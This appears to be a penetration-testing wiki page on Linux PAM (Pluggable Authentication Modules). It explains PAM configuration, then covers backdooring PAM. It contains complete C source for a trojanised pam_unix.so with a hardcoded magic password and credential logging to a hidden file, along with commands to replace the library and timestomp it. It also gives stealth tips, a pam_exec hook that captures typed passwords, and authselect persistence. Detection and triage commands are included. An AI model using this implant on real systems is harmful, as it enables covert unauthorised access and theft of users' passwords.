_body: "# PAM - Pluggable Authentication Modules\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### Basic Information\n\
  \n**PAM (Pluggable Authentication Modules)** acts as a security mechanism that **verifies the identity of users attempting\
  \ to access computer services**, controlling their access based on various criteria. It's akin to a digital gatekeeper,\
  \ ensuring that only authorized users can engage with specific services while potentially limiting their usage to prevent\
  \ system overloads.\n\n#### Configuration Files\n\n- **Solaris and UNIX-based systems** typically utilize a central configuration\
  \ file located at `/etc/pam.conf`.\n- **Linux systems** prefer a directory approach, storing service-specific configurations\
  \ within `/etc/pam.d`. For instance, the configuration file for the login service is found at `/etc/pam.d/login`.\n\nAn\
  \ example of a PAM configuration for the login service might look like this:\n\n```\nauth required /lib/security/pam_securetty.so\n\
  auth required /lib/security/pam_nologin.so\nauth sufficient /lib/security/pam_ldap.so\nauth required /lib/security/pam_unix_auth.so\
  \ try_first_pass\naccount sufficient /lib/security/pam_ldap.so\naccount required /lib/security/pam_unix_acct.so\npassword\
  \ required /lib/security/pam_cracklib.so\npassword required /lib/security/pam_ldap.so\npassword required /lib/security/pam_pwdb.so\
  \ use_first_pass\nsession required /lib/security/pam_unix_session.so\n```\n\n#### **PAM Management Realms**\n\nThese realms,\
  \ or management groups, include **auth**, **account**, **password**, and **session**, each responsible for different aspects\
  \ of the authentication and session management process:\n\n- **Auth**: Validates user identity, often by prompting for a\
  \ password.\n- **Account**: Handles account verification, checking for conditions like group membership or time-of-day restrictions.\n\
  - **Password**: Manages password updates, including complexity checks or dictionary attacks prevention.\n- **Session**:\
  \ Manages actions during the start or end of a service session, such as mounting directories or setting resource limits.\n\
  \n#### **PAM Module Controls**\n\nControls dictate the module's response to success or failure, influencing the overall\
  \ authentication process. These include:\n\n- **Required**: Failure of a required module results in eventual failure, but\
  \ only after all subsequent modules are checked.\n- **Requisite**: Immediate termination of the process upon failure.\n\
  - **Sufficient**: Success bypasses the rest of the same realm's checks unless a subsequent module fails.\n- **Optional**:\
  \ Only causes failure if it's the sole module in the stack.\n\n#### Offensive Semantics That Matter\n\nWhen backdooring\
  \ PAM, the **location of the inserted rule** is often more important than the payload itself:\n\n- `include` and `substack`\
  \ pull rules from other files, so editing `sshd` might only affect SSH while editing `system-auth`, `common-auth`, or another\
  \ shared stack affects several services at once.\n- PAM also supports bracketed controls such as `[success=1 default=ignore]`.\
  \ These can be abused to **skip one or more modules** after a successful custom check instead of visibly replacing `pam_unix.so`.\n\
  - The `module-path` can be **absolute** (`/usr/lib/security/pam_custom.so`) or **relative** to the default PAM module directory.\
  \ On modern Linux systems the real directories are often `/lib/security`, `/lib64/security`, `/usr/lib/security`, or multiarch\
  \ paths like `/usr/lib/x86_64-linux-gnu/security`.\n\nQuick operator takeaway: always map the **full service graph** before\
  \ patching. For example, `sshd -> password-auth -> system-auth` on some distros or `sshd -> system-remote-login -> system-login\
  \ -> system-auth` on others means the same one-line implant may fan out much wider than intended.\n\n#### Example Scenario\n\
  \nIn a setup with multiple auth modules, the process follows a strict order. If the `pam_securetty` module finds the login\
  \ terminal unauthorized, root logins are blocked, yet all modules are still processed due to its \"required\" status. The\
  \ `pam_env` sets environment variables, potentially aiding in user experience. The `pam_ldap` and `pam_unix` modules work\
  \ together to authenticate the user, with `pam_unix` attempting to use a previously supplied password, enhancing efficiency\
  \ and flexibility in authentication methods.\n\n\n## Backdooring PAM – Hooking `pam_unix.so`\n\nA classic persistence trick\
  \ in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**.  Because every SSH\
  \ / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials\
  \ or implement a *magic* password bypass.\n\n### Compilation Cheatsheet\n<details>\n<summary>Sample `pam_unix.so` trojan</summary>\n\
  \n```c\n#define _GNU_SOURCE\n#include <security/pam_modules.h>\n#include <dlfcn.h>\n#include <stdio.h>\n#include <fcntl.h>\n\
  #include <unistd.h>\n\nstatic int (*orig)(pam_handle_t *, int, int, const char **);\nstatic const char *MAGIC = \"Sup3rS3cret!\"\
  ;\n\nint pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {\n    const char *user, *pass;\n\
  \    pam_get_user(pamh, &user, NULL);\n    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);\n\n    /* Magic pwd → immediate\
  \ success */\n    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;\n\n    /* Credential harvesting */\n    int fd\
  \ = open(\"/usr/bin/.dbus.log\", O_WRONLY|O_APPEND|O_CREAT, 0600);\n    dprintf(fd, \"%s:%s\\n\", user, pass);\n    close(fd);\n\
  \n    /* Fall back to original function */\n    if(!orig) {\n        orig = dlsym(RTLD_NEXT, \"pam_sm_authenticate\");\n\
  \    }\n    return orig(pamh, flags, argc, argv);\n}\n```\n\n</details>\n\nCompile and stealth-replace:\n```bash\ngcc -fPIC\
  \ -shared -o pam_unix.so trojan_pam.c -ldl -lpam\nmv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak\nmv pam_unix.so\
  \ /lib/security/pam_unix.so\nchmod 644 /lib/security/pam_unix.so     # keep original perms\ntouch -r /bin/ls /lib/security/pam_unix.so\
  \  # timestomp\n```\n\n### OpSec Tips\n1. **Atomic overwrite** – write to a temp file and `mv` into place to avoid half-written\
  \ libraries that would lock out SSH.\n2. Log file placement such as `/usr/bin/.dbus.log` blends with legitimate desktop\
  \ artefacts.\n3. Keep symbol exports identical (`pam_sm_setcred`, etc.) to avoid PAM mis-behaviour.\n\n### Detection\n*\
  \ Compare MD5/SHA256 of `pam_unix.so` against distro package.\n* `rpm -V pam` or `debsums -s libpam-modules` to spot replaced\
  \ libraries without manual hashing.\n* Check for world-writable or unusual ownership under `/lib/security/`.\n* `auditd`\
  \ rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.\n* Grep PAM configs for unexpected modules: `grep -R \"pam_[a-z].*\\\
  .so\" /etc/pam.d/ | grep -v pam_unix`.\n\n### Quick triage commands (post-compromise or threat hunting)\n```bash\n# 1) Spot\
  \ alien PAM objects\nfind /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\\n' | grep\
  \ -E 'pam_|libselinux'\n\n# 2) Verify package integrity\ncommand -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules\n\
  \n# 3) Identify non-packaged PAM modules\nfor f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do\n    dpkg -S \"$f\"\
  \ >/dev/null 2>&1 || echo \"UNPACKAGED: $f\";\ndone\n\n# 4) Look for stealth config edits\ngrep -R \"pam_.*\\.so\" /etc/pam.d/\
  \ | grep -E 'plg|selinux|custom|exec'\n```\n\n### Abusing `pam_exec` for persistence\nInstead of replacing `pam_unix.so`,\
  \ a lighter touch is to append a `pam_exec` line in `/etc/pam.d/sshd` so every SSH login launches an implant while leaving\
  \ the normal stack intact:\n```bash\n# Run on successful auth and receive the typed password on stdin\nauth optional pam_exec.so\
  \ quiet expose_authtok /usr/local/bin/.ssh_hook.sh\n```\n`pam_exec` receives PAM metadata in environment variables such\
  \ as `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, and `PAM_TYPE`. With `expose_authtok`, the helper can also read\
  \ the password from `stdin` during `auth` or `password` phases. If you want the helper to run with the effective UID instead\
  \ of the real UID, add `seteuid`.\n\nPractical notes:\n\n- `session optional pam_exec.so ...` is better for **post-login\
  \ actions** such as re-opening sockets or spawning a detached daemon.\n- `auth optional pam_exec.so quiet expose_authtok\
  \ ...` is the usual choice for **credential capture** because it runs before the session opens.\n- `type=session` or `type=auth`\
  \ can be used to constrain execution to a specific PAM phase and avoid noisy double execution.\n\n### Surviving distro tooling:\
  \ `authselect`\n\nOn RHEL, CentOS Stream, Fedora, and derivative systems, direct edits to generated files such as `/etc/pam.d/system-auth`\
  \ or `/etc/pam.d/password-auth` may be **overwritten by `authselect`**. For persistence, operators often patch the active\
  \ custom profile under `/etc/authselect/custom/<profile>/` and then re-select or apply it.\n\nTypical workflow when you\
  \ have root:\n\n```bash\n# Inspect the active profile first\nauthselect current\n\n# If a custom profile already exists,\
  \ edit its PAM templates instead of system-auth directly\nfind /etc/authselect/custom -maxdepth 2 -type f \\( -name 'system-auth'\
  \ -o -name 'password-auth' \\) -ls\n\n# Re-apply the profile after modifying the template files\nauthselect select custom/<profile>\n\
  ```\n\nThis matters for both offense and triage: if `/etc/pam.d/system-auth` contains the banner `Generated by authselect`\
  \ and `Do not modify this file manually`, then the real persistence point may live under `/etc/authselect/custom/` rather\
  \ than in `/etc/pam.d/`.\n\n### Recent tradecraft seen in the wild\n\nRecent 2025 reporting on the **Plague** Linux backdoor\
  \ showed the same core idea taken further: a malicious PAM component with a **static bypass password**, plus cleanup of\
  \ SSH-related environment variables and shell history (`HISTFILE=/dev/null`) to reduce session traces after login. That\
  \ is a useful hunting pattern because the backdoor logic may live in PAM while the stealth artifacts only appear **after**\
  \ authentication succeeds.\n\n\n## References\n\n- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)\n\
